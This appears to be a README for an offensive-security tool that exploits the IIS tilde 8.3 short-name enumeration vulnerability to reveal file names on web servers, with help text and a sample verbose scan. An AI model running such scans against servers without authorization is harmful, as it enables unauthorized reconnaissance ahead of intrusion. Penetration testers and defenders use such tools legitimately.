iis_tilde_enum
==========

Takes a URL and then exploits the IIS tilde 8.3 enumeration vuln and tries to get you full file names.

You feed this script a URL and also a word list of potential file names. The script will look up the file
roots in your word list and then try them with appropriate extensions.

For word lists, the [fuzzdb](https://code.google.com/p/fuzzdb/) word lists are pretty good. We sometimes use the
https://code.google.com/p/fuzzdb/source/browse/trunk/discovery/PredictableRes/raft-small-words-lowercase.txt
(or large or medium) for this work.

This is not a directory enumerator (i.e., tries all words in a list against a web server). It will only find
directories that have names longer than 8 characters (since only then will they have 8.3 names and be recognized
by the vulnerability). You should still try to enumerate directories using a word list and
[DirBuster](https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project) or Burp Intruder or something.

Just as a note: on Windows computers you can view 8.3 names in the command prompt window by using the
`dir /x` command. One of the columns will be the 8.3 name (if there is one).

Always enjoy feedback and suggestions.


Help
====
<pre>$  ./tilde_enum.py -h
usage: tilde_enum.py [-h] [-d DIRWORDLIST] [-f] [-o OUT_FILE] [-p PROXY]
                     [-u URL] [-v VERBOSE_LEVEL] [-w WAIT]
                     [--resume RESUME_STRING] [--limit-ext LIMIT_EXTENSION]

Exploits and expands the file names found from the tilde enumeration vuln

optional arguments:
  -h, --help            show this help message and exit
  -d DIRWORDLIST        an optional wordlist for directory name content
  -f                    force testing of the server even if the headers do not
                        report it as an IIS system
  -o OUT_FILE           Filename to store output
  -p PROXY              Use a proxy host:port
  -u URL                URL to scan
  -v VERBOSE_LEVEL      verbose level of output (0~2)
  -w WAIT               time in seconds to wait between requests
  --resume RESUME_STRING
                        Resume from a given name (length &lt;= 6)
  --limit-ext LIMIT_EXTENSION
                        Enumerate for given extension only
</pre>


Sample Output
======
<pre>
$  ./tilde_enum.py -u "http://iis/" -w 0.1 -v 2 --resume=jss --limit-ext=htm
[-]  Verbose Level=2 ....brace yourself for additional information.
[-]  Testing with dummy file request http://iis/MH2GpGp9k44uw.htm
[-]    URLNotThere -> HTTP Code: 404, Response Length: 1379
[-]  Testing with user-submitted http://iis/
[-]    URLUser -> HTTP Code: 200, Response Length: 46
[-]  --limit-ext is set. Find names end with given extension only: htm
[-]  Resume from "jss"... characters before this will be ignored.
[-]  User-supplied delay detected. Waiting 0.1 seconds between HTTP requests.
[+]  HTTP Response Codes: {'user_length': 46, 'not_there_length': 1379, 'user_code': 200, 'not_there_code': 404}
[+]  The server is reporting that it is IIS (Microsoft-IIS/6.0).
[+]  The server is vulnerable to the IIS tilde enumeration vulnerability..
[+]  counterEnum: jssfhc~1 to ~2.
[+]  Found file:  jssfhc~1.htm
[+]  counterEnum: jsstra~1 to ~2.
[+]  Found file:  jsstra~1.htm
[-]  Finished doing the 8.3 enumeration for /.

---------- FINAL OUTPUT ------------------------------
http://iis/jssfhc~1.htm
http://iis/jsstra~1.htm
---------- OUTPUT COMPLETE ---------------------------
</pre>
